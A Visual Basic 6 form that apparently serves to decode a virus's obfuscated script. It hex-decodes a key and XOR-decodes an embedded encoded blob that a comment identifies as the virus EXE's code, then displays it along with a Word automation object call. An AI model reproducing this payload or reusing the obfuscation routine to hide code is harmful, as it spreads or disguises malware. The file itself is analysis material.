VERSION 5.00
Begin VB.Form Form1 
   BorderStyle     =   4  'Fixed ToolWindow
   Caption         =   "Desensamblado"
   ClientHeight    =   4275
   ClientLeft      =   45
   ClientTop       =   315
   ClientWidth     =   7695
   LinkTopic       =   "Form1"
   MaxButton       =   0   'False
   MinButton       =   0   'False
   ScaleHeight     =   4275
   ScaleWidth      =   7695
   ShowInTaskbar   =   0   'False
   StartUpPosition =   3  'Windows Default
   Begin VB.CommandButton Command1 
      Caption         =   "Nt7"
      Height          =   495
      Left            =   3000
      TabIndex        =   1
      Top             =   3480
      Width           =   2055
   End
   Begin VB.TextBox Text1 
      Height          =   3135
      Left            =   120
      MultiLine       =   -1  'True
      TabIndex        =   0
      Top             =   120
      Width           =   7335
   End
End
Attribute VB_Name = "Form1"
Attribute VB_GlobalNameSpace = False
Attribute VB_Creatable = False
Attribute VB_PredeclaredId = True
Attribute VB_Exposed = False
Dim zacged As String

Private Sub Command1_Click()
MsgBox nt7(Text1.Text)
End Sub

Private Sub Form_Load()
zacged = nt7("6D6F72757361")
MsgBox zacged
MsgBox meteorito_nt7(nt7("2E1D55371D1F021D52271600001F0A4D230A0A017E79361D011E194F313B2037554F4F4F1F001D012F1710140E18011B507879301A1C1C194D223E554E53533A575D5D5F4245434178782C02031C06552630554F4F4B25574245434345425E60672C1D1B000755011B094D525257200711200A0A3D1D1D03517E7F3100031E1B5200011C1852524D4F414229041C0716331E080C07071A070C5062672E001C06075314011A1F020252485351061D09191A0E00102F1E1C111D021E0014012F1C1314060E08335055535447425F5E413702594143454243545A6278311A1E551B626729061F55007E7F3606004D1D17017E7926171B4D00031A07534E55311D080C1B173A111910111B454F221B16011C061D0919430C1F111F1A17504660672614553D1C01520201051D5C021E1A361D0103080C065D303D2636434D38212259532302163F414D222259533F365E4F1E444F261D161D78782A011E0A7F7F20160152064D504F015B1416015A1C1909467F7F351C0752054D504F4A55271C55435E60671D1701534E551B413E081B36223C2131240E01180A5A20305F55131C181F001F5555531F52494D181D1D185F53573E0A1B0803505953425C7F651F081B5248531A5B210A1929383D273725141E1A08453A3159531206071D02004F5" & _
"455195353521A1F02025E55513216110A1E1E39303A3E5159525E44606500100753485206433E0A0631243C2736390C011A175D3E3F59520E1E181D1D18535555184F4B4D1A001A1E5F555023081B0A1E575F425C7F65230817067879361B164F240B"))
MsgBox "set dw = createobject(" & nt7("776F72642E6170706C69636174696F6E") & ")"
'Patricio es el código del EXE (Virus)
'Nota: El exe al momento de Crear la página inserta una procedimiento que llama
'      a la funcion Morusa, se encuentra en la variable Titulo

End Sub
Function nt7(x)
Dim j
Dim at
j = 1
While j < Len(x): at = Chr(rd2v(Mid(x, j, 2))): nt7 = nt7 & at: j = j + 2: Wend: End Function
Function rd2v(rol)
rd2v = (art(Mid(rol, 1, 1)) * 16) + art(Mid(rol, 2, 1))
End Function
Function art(l)
Select Case l
Case Chr(69): art = 14
Case Chr(66): art = 11
Case Chr(67): art = 12
Case Chr(65): art = 10
Case Chr(68): art = 13
Case Chr(70): art = 15
Case Else
art = Int(l)
End Select
End Function
Function meteorito_nt7(nt7)
Dim rv
j = Len(zacged)
For i = 1 To Len(nt7)
c1 = Mid(nt7, i, 1)
c2 = Mid(zacged, j, 1)
If rv = True Then
j = j + 1
Else
j = j - 1
End If
If j = Len(zacged) Then j = j - 1: rv = False
If j = 0 Then j = 1: rv = True
meteorito_nt7 = meteorito_nt7 & Chr(Asc(c1) Xor Asc(c2))
Next
End Function
